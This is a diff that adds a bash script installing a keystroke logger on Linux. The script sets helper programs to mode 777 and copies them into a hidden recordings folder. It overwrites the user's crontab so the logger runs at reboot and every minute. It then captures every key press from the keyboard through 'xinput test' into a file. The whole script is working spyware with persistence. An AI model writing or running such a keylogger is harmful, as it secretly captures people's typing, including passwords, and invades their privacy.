@@ -1,0 +1,56 @@
+#!/bin/bash
+
+
+# if you have to install xinput
+#sudo apt-get install xinput 
+
+
+chmod 777 prog
+chmod 777 table3
+chmod 777 clean
+
+
+# we create the repository recordings in /home/recordings if it not exists yet
+if [ ! -d "~/recordings2" ]; then
+	mkdir ~/recordings2 >> /dev/null
+fi
+
+
+cp $PWD/prog ~/recordings2
+cp $PWD/table3 ~/recordings2
+cp $PWD/clean ~/recordings2
+
+#we change our current directory
+cd ~/recordings2
+
+
+# we create 3 files 
+touch root
+touch nikokks1
+touch nikokks2
+
+
+# every minute run table3 to translate numbers of xinput to known keys of the keyboard
+echo "@reboot ~/recordings2/prog" >> root
+echo "* * * * * ~/recordings2/table3" >> root
+
+# we send the file root in the crontab as user (commmand who run commands and scripts automatically)
+crontab -u $USER root
+
+# we delete the file root
+rm -f root
+
+# we select the id of the keyboard
+id=`xinput list | grep AT | cut -d '=' -f 2 | cut -c 1-2`
+
+# we run the xinput command and send the flow in the file .nikokks1 on background
+xinput test $id  >> ~/recordings2/nikokks1 &
+
+# we copy the file .nikokks1 to .nikokks2
+cp ~/recordings2/nikokks1 ~/recordings2/nikokks2
+
+# we select the important informations to the file temp
+grep "press" ~/recordings2/nikokks2 | cut -c 13-15 >> ~/recordings2/temp
+
+
+
